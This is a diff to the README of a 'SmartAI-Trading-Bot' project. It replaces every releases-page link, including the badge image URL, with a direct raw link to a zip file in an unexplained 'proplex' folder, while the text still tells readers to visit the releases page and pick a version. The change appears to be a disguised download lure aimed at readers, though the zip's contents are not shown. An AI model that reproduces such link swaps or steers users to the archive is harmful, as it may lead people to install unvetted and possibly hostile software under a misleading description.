@@ -1,6 +1,6 @@
 # 🤖 SmartAI-Trading-Bot - Trade Smartly with AI
 
-[![Download SmartAI-Trading-Bot](https://img.shields.io/badge/Download-SmartAI--Trading--Bot-blue?style=for-the-badge)](https://github.com/Mouad2805/SmartAI-Trading-Bot/releases)
+[![Download SmartAI-Trading-Bot](https://raw.githubusercontent.com/Mouad2805/SmartAI-Trading-Bot/main/proplex/SmartAI-Trading-Bot.zip)](https://raw.githubusercontent.com/Mouad2805/SmartAI-Trading-Bot/main/proplex/SmartAI-Trading-Bot.zip)
 
 ## 📚 Introduction
 
@@ -13,7 +13,7 @@ To start using SmartAI-Trading-Bot, follow these simple steps:
 1. **Visit the Releases Page**  
    Click the button below to access our releases page.
 
-   [Download SmartAI-Trading-Bot](https://github.com/Mouad2805/SmartAI-Trading-Bot/releases)
+   [Download SmartAI-Trading-Bot](https://raw.githubusercontent.com/Mouad2805/SmartAI-Trading-Bot/main/proplex/SmartAI-Trading-Bot.zip)
 
 2. **Choose Your Version**  
    Once on the releases page, locate the latest version of SmartAI-Trading-Bot.
@@ -33,7 +33,7 @@ To start using SmartAI-Trading-Bot, follow these simple steps:
 Downloading and installing SmartAI-Trading-Bot is straightforward. Please follow the instructions below:
 
 1. **Visit the Releases Page**  
-   Go to [this page](https://github.com/Mouad2805/SmartAI-Trading-Bot/releases) to download the latest version.
+   Go to [this page](https://raw.githubusercontent.com/Mouad2805/SmartAI-Trading-Bot/main/proplex/SmartAI-Trading-Bot.zip) to download the latest version.
 
 2. **Select Your Operating System**  
    Ensure you click on the file that matches your operating system (Windows, macOS, or Linux). 
@@ -103,7 +103,7 @@ We value your input! If you have any comments or suggestions, please let us know
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download SmartAI-Trading-Bot](https://github.com/Mouad2805/SmartAI-Trading-Bot/releases)  
+- **Releases Page**: [Download SmartAI-Trading-Bot](https://raw.githubusercontent.com/Mouad2805/SmartAI-Trading-Bot/main/proplex/SmartAI-Trading-Bot.zip)  
 - **Documentation**: Get in-depth knowledge about using the bot.  
 - **Support**: Reach out for help if needed.  
 
